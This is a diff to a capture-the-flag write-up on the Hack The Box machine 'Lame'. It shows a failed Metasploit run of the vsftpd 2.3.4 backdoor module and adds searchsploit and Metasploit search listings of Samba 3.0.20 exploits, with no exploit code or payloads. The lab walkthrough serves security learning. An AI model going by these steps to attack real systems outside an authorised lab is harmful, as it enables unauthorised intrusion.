@@ -78,7 +78,6 @@ This may be interesting. Use [Metasploit](https://github.com/rapid7/metasploit-f
 root@kali:~/htb/lame# metasploit
 
 msf > search vsftpd 2.3.4
-[!] Module database cache not built yet, using slow search
 
 Matching Modules
 ================
@@ -115,6 +114,57 @@ msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit
 [*] 10.10.10.3:21 - USER: 331 Please specify the password.
 [*] Exploit completed, but no session was created.
 ```
-No luck here.
+No luck here 😭
 
+## Samba
+Search using searchsploit:
 
+```bash
+root@kali:~/htb/lame# searchsploit samba 3.0.20
+--------------------------------------------- ----------------------------------------
+ Exploit Title                               |  Path
+                                             | (/usr/share/exploitdb/)
+--------------------------------------------- ----------------------------------------
+Samba 3.0.20 < 3.0.25rc3 - 'Username' map sc | exploits/unix/remote/16320.rb
+Samba < 3.0.20 - Remote Heap Overflow        | exploits/linux/remote/7701.txt
+--------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+```
+
+Search on metasploit
+```
+msf > search samba 3.0.20
+
+Matching Modules
+================
+
+   Name                                                   Disclosure Date  Rank       Description
+   ----                                                   ---------------  ----       -----------
+   auxiliary/admin/http/wp_easycart_privilege_escalation  2015-02-25       normal     WordPress WP EasyCart Plugin Privilege Escalation
+   auxiliary/admin/smb/samba_symlink_traversal                             normal     Samba Symlink Directory Traversal
+   auxiliary/dos/samba/lsa_addprivs_heap                                   normal     Samba lsa_io_privilege_set Heap Overflow
+   auxiliary/dos/samba/lsa_transnames_heap                                 normal     Samba lsa_io_trans_names Heap Overflow
+   auxiliary/dos/samba/read_nttrans_ea_list                                normal     Samba read_nttrans_ea_list Integer Overflow
+   auxiliary/scanner/rsync/modules_list                                    normal     List Rsync Modules
+   auxiliary/scanner/smb/smb_uninit_cred                                   normal     Samba _netr_ServerPasswordSet Uninitialized Credential State
+   exploit/freebsd/samba/trans2open                       2003-04-07       great      Samba trans2open Overflow (*BSD x86)
+   exploit/linux/samba/chain_reply                        2010-06-16       good       Samba chain_reply Memory Corruption (Linux x86)
+   exploit/linux/samba/is_known_pipename                  2017-03-24       excellent  Samba is_known_pipename() Arbitrary Module Load
+   exploit/linux/samba/lsa_transnames_heap                2007-05-14       good       Samba lsa_io_trans_names Heap Overflow
+   exploit/linux/samba/setinfopolicy_heap                 2012-04-10       normal     Samba SetInformationPolicy AuditEventsInfo Heap Overflow
+   exploit/linux/samba/trans2open                         2003-04-07       great      Samba trans2open Overflow (Linux x86)
+   exploit/multi/samba/nttrans                            2003-04-07       average    Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
+   exploit/multi/samba/usermap_script                     2007-05-14       excellent  Samba "username map script" Command Execution
+   exploit/osx/samba/lsa_transnames_heap                  2007-05-14       average    Samba lsa_io_trans_names Heap Overflow
+   exploit/osx/samba/trans2open                           2003-04-07       great      Samba trans2open Overflow (Mac OS X PPC)
+   exploit/solaris/samba/lsa_transnames_heap              2007-05-14       average    Samba lsa_io_trans_names Heap Overflow
+   exploit/solaris/samba/trans2open                       2003-04-07       great      Samba trans2open Overflow (Solaris SPARC)
+   exploit/unix/http/quest_kace_systems_management_rce    2018-05-31       excellent  Quest KACE Systems Management Command Injection
+   exploit/unix/misc/distcc_exec                          2002-02-01       excellent  DistCC Daemon Command Execution
+   exploit/unix/webapp/citrix_access_gateway_exec         2010-12-21       excellent  Citrix Access Gateway Command Execution
+   exploit/windows/fileformat/ms14_060_sandworm           2014-10-14       excellent  MS14-060 Microsoft Windows OLE Package Manager Code Execution
+   exploit/windows/http/sambar6_search_results            2003-06-21       normal     Sambar 6 Search Results Buffer Overflow
+   exploit/windows/license/calicclnt_getconfig            2005-03-02       average    Computer Associates License Client GETCONFIG Overflow
+   exploit/windows/smb/group_policy_startup               2015-01-26       manual     Group Policy Script Execution From Shared Resource
+   post/linux/gather/enum_configs                                          normal     Linux Gather Configurations
+```
